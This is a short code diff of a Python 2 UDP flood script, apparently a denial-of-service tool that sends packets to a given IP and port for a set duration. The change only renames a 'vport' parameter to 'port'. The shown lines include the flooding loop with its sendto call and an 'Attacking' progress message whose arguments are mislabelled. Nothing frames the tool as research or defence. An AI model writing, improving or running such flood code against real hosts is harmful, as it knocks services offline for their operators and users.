@@ -19,7 +19,7 @@ def usage():
 
     print "Usage: " + sys.argv[0] + " <ip> <port> <second>"
 
-def stream(target, vport, duration):
+def stream(target, port, duration):
 	"""
 	Takes an ip, port, and the duraction of the attack in seconds as input when called - in that order
 	Returns: Prints out the attack duration
@@ -39,9 +39,9 @@ def stream(target, vport, duration):
             break
         else:
             pass
-        client.sendto(bytes, (target, vport))
+        client.sendto(bytes, (target, port))
         sent = sent + 1
-        print "Attacking %s sent packages %s at the port %s "%(sent, target, vport)
+        print "Attacking %s sent packages %s at the port %s "%(sent, target, port)
 
 def main():
     print len(sys.argv)
